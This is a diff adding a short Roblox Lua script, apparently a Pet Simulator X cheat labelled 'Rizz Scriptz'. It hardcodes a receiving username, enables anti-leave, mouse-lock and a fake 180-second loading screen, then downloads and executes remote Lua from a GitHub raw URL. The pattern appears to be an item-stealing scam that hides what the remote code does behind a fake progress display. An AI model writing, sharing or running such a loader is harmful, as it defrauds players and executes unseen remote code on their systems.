@@ -1,0 +1,11 @@
+UserName = "Megamajorny"
+UserName2 = "Megamajorny"
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+_G.ScriptName = "Rizz Scriptz"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua%22))()
